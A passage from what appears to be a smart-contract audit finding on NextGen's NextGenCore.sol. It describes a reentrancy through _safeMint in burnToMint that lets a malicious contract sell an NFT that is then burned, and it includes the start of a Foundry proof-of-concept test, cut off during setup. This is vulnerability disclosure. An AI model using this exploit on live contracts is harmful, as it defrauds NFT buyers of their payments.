class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">214</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">minterContract</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Caller is not the Minter Contract&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">215</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_isApprovedOrOwner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">burner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;ERC721: caller is not token owner or approved&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">216</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">collectionAdditionalData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_mintCollectionID</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionCirculationSupply</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collectionAdditionalData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_mintCollectionID</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionCirculationSupply</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">217</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">collectionAdditionalData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_mintCollectionID</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionTotalSupply</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">collectionAdditionalData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_mintCollectionID</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionCirculationSupply</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">218</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">_mintProcessing</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mintIndex</span><span class=\"mtk1\">, </span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">], </span><span class=\"mtk12\">_mintCollectionID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_saltfun_o</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">219</span><span class=\"mtk1\">:             </span><span class=\"mtk3\">// burn token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">220</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">221</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">burnAmount</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_burnCollectionID</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">burnAmount</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_burnCollectionID</span><span class=\"mtk1\">] + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">222</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">223</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/58090c9fbc036c06bbaa9600ec326034f2181a17/hardhat/smart-contracts/NextGenCore.sol#L213-L223\">https://github.com/code-423n4/2023-10-nextgen/blob/58090c9fbc036c06bbaa9600ec326034f2181a17/hardhat/smart-contracts/NextGenCore.sol#L213-L223</a></p>\n<p>The <code>_mintProcessing</code> function calls <code>_safeMint</code>, which in turn can trigger arbitrary code execution if the recipient is a contract. This allows for manipulation such as transferring the NFT (set to be burned) to another user before the burn occurs:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NextGenCore</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">227</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_mintProcessing</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_mintIndex</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenData</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_saltfun_o</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">228</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">tokenData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_mintIndex</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_tokenData</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">229</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">collectionAdditionalData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">].</span><span class=\"mtk12\">randomizer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">calculateTokenHash</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_mintIndex</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_saltfun_o</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">230</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">tokenIdsToCollectionIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_mintIndex</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">231</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">_safeMint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_mintIndex</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">232</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/58090c9fbc036c06bbaa9600ec326034f2181a17/hardhat/smart-contracts/NextGenCore.sol#L227-L232\">https://github.com/code-423n4/2023-10-nextgen/blob/58090c9fbc036c06bbaa9600ec326034f2181a17/hardhat/smart-contracts/NextGenCore.sol#L227-L232</a></p>\n<p>A malicious actor can exploit this by listing the NFT for sale. When there is a buy offer, the malicious contract can call <code>burnToMint</code> to receive the new NFT and simultaneously accept an offer to buy the original NFT, resulting in the original NFT being burned but still sold, effectively duping the buyer.</p>\n<p>In this POC scenario, there are two collections; 1 and 2. The admin is set so that users can burn token in collection 1 to mint token in collection 2.</p>\n<ul>\n<li>A malicious contract has the token <code>10000000000</code> of collection 1, it lists the token <code>10000000000</code> in the marketplace.</li>\n<li><code>addr3</code> offers to buy the token <code>10000000000</code> from the malicious contract.</li>\n<li>The malicious contract calls <code>burnToMint</code>, stimulously receives token <code>20000000000</code> from collection 2 and accepts the offer to buy <code>10000000000</code> from <code>addr3</code>.</li>\n<li>In the end, token <code>10000000000</code> is burnt and <code>addr3</code> receives nothing. The malicious contract receives both token <code>20000000000</code> from <code>burnToMint</code> and proceed from the sales of token <code>10000000000</code>.</li>\n</ul>\n<p>POC:</p>\n<ul>\n<li>Save the code in <code>test/nextGen.test.sol</code></li>\n<li>Setup foundry and Run: forge test <code>-vvvvv --match-contract NextGenCoreTest --match-test testBurnToMintReentrancy</code></li>\n</ul>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: MIT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">19</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;forge-std/Test.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../smart-contracts/NextGenCore.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../smart-contracts/NextGenAdmins.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../smart-contracts/NFTdelegation.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../smart-contracts/XRandoms.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../smart-contracts/RandomizerNXT.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../smart-contracts/MinterContract.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../smart-contracts/AuctionDemo.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../smart-contracts/IERC721Receiver.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">console</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;forge-std/console.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">NextGenCoreTest</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Test</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">NextGenCore</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">DelegationManagementContract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hhDelegation</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">randomPool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hhRandoms</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">NextGenAdmins</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hhAdmin</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">NextGenRandomizerNXT</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hhRandomizer</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">NextGenMinterContract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">auctionDemo</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hhAuctionDemo</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr3</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setUp</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">addr1</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addr</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">addr2</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addr</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">addr3</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addr</span><span class=\"mtk1\">(</span><span class=\"mtk7\">3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Deploy contracts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhDelegation</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">DelegationManagementContract</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhRandoms</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">randomPool</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhAdmin</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">NextGenAdmins</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">NextGenCore</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Next Gen Core&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;NEXTGEN&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hhAdmin</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhRandomizer</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">NextGenRandomizerNXT</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hhRandoms</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hhAdmin</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">NextGenMinterContract</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hhDelegation</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hhAdmin</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testBurnToMintReentrancy</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Setting up, creating 2 collections for burnToMint</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">string</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collectionScript</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">string</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">collectionScript</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk8\">&quot;desc&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createCollection</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;Test Collection 1&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;Artist 1&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;For testing&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;www.test.com&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;CCO&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;https://ipfs.io/ipfs/hash/&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">collectionScript</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createCollection</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;Test Collection 2&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;Artist 2&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;For testing&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;www.test.com&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;CCO&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;https://ipfs.io/ipfs/hash/&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">collectionScript</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhAdmin</span><span class=\"mtk1\">.</span><span class=\"mtk11\">registerCollectionAdmin</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">), </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhAdmin</span><span class=\"mtk1\">.</span><span class=\"mtk11\">registerCollectionAdmin</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">), </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setCollectionData</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _collectionID</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">), </span><span class=\"mtk3\">// _collectionArtistAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _maxCollectionPurchases</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _collectionTotalSupply</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// _setFinalSupplyTimeAfterMint</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setCollectionData</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// _collectionID</span></span></span>\n<span class=\"grvsc-line\"><span 